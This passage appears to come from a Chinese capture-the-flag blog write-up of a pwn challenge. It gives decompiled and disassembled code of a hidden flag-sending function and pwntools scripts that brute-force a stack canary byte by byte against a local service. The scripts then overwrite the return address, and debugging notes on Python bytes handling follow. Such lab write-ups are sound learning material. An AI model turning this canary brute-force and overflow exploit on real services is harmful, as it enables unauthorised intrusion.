&lt;p&gt;​		假设已经得到了canary了,下一步是覆盖返回地址,有onegadget还是system binsh?后门函数?&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;ssize_t&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sub_400B76&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; fd; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd = open(&lt;span class=&#34;string&#34;&gt;&amp;quot;./flag&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( fd &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    perror(&lt;span class=&#34;string&#34;&gt;&amp;quot;open flag failed&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; read(fd, &amp;amp;unk_602160, &lt;span class=&#34;number&#34;&gt;0x64&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		会把flag读到bss段,0x602160, 然后再构造一个puts把它打印出来吧,这里不需要libc了吗&lt;/p&gt;
&lt;p&gt;​		溢出长度 + ebp + sub_400B76 + puts地址 + 返回地址 + 参数&lt;/p&gt;
&lt;p&gt;​		nonono ,其实是这里藏了一个函数,为啥ida没有显示出来呢????&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;0000000000400B&lt;/span&gt;C6                 push    rbp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;0000000000400B&lt;/span&gt;C7                 mov     rbp, rsp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;0000000000400B&lt;/span&gt;CA                 mov     eax, cs:fd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;0000000000400B&lt;/span&gt;D0                 mov     ecx, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;0000000000400B&lt;/span&gt;D5                 mov     edx, &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;h ; &lt;span class=&#34;string&#34;&gt;&amp;#x27;d&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;0000000000400B&lt;/span&gt;DA                 mov     esi, offset unk_602160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;0000000000400B&lt;/span&gt;DF                 mov     edi, eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;0000000000400B&lt;/span&gt;E1                 call    _send&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;0000000000400B&lt;/span&gt;E6                 nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;0000000000400B&lt;/span&gt;E7                 pop     rbp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;0000000000400B&lt;/span&gt;E8                 retn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;leak_canary&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    canary = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(canary) != &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                p = remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;127.0.0.1&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;5555&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Welcome!\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                payload = &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; * (&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;) + canary + &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                msg = p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;b&amp;#x27;received&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; msg:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    canary += &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    p.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                p.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                p.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(canary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; u64(canary.ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;pwn&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    canary = leak_canary()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p = remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;127.0.0.1&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;5555&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Welcome!\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payload = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt; * (&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;) + p64(canary) + &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x400bc6&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwn()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;问题: 这个栈的104长度好像不太对&lt;/p&gt;
&lt;h2 id=&#34;排错&#34;&gt;&lt;a href=&#34;#排错&#34; class=&#34;headerlink&#34; title=&#34;排错&#34;&gt;&lt;/a&gt;排错&lt;/h2&gt;&lt;p&gt;​		寄,卡在了字符怎么表示这里,然后产生了一大堆的问题,最后调试分析后发现是python2与python3版本差别,对字符串和bytes表示不同的问题,有点乱&lt;/p&gt;
&lt;p&gt;这里有一个问题,就是int怎么转byte&lt;/p&gt;
&lt;p&gt;还有就是这样的程序怎么调试呢……….&lt;/p&gt;
&lt;p&gt;还有str转bytei&lt;/p&gt;
&lt;p&gt;留念一下你写的奇葩东西&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; [&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;b&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;c&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;e&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;f&amp;quot;&lt;/span&gt;]:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#print(j)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s = socket.socket()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s.connect((&lt;span class=&#34;string&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5555&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ret = s.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#j = b&amp;quot;a&amp;quot;*104 + j.to_bytes(1,&amp;#x27;little&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    j = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;104&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(j).encode(&lt;span class=&#34;string&#34;&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(j))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s.send(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#s.send(j.to_bytes(1,&amp;#x27;little&amp;#x27;))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ret = s.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(ret)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		首先,应该是爆破256个数字,这个是ascii码的范围? 然后不是str,而是chr, 对应的字符&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; socket&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#print(j)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s = socket.socket()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s.connect((&lt;span class=&#34;string&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5555&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ret = s.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#j = b&amp;quot;a&amp;quot;*104 + j.to_bytes(1,&amp;#x27;little&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    j = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;104&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(j).encode(&lt;span class=&#34;string&#34;&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(j))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s.send(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#s.send(j.to_bytes(1,&amp;#x27;little&amp;#x27;))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ret = s.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(ret)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;b’aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00’&lt;br&gt;b’Message received!\n’&lt;/p&gt;
&lt;p&gt;​		然后就可以了!!! 为啥之前一直不行呢?….&lt;/p&gt;
&lt;p&gt;​		还有就是break为什么break不出去呢? 当时可能就是因为是在这里一直没跳出去..所以以为一直没成功,其实成功l ,ret里明明有的,但是ret好像是bytes类型,而咱给的是字符串,所以不行. 在它前面加一个b就可以了&lt;font color=&#34;red&#34;&gt;!if  b”Message received!” in ret:&lt;/font&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span 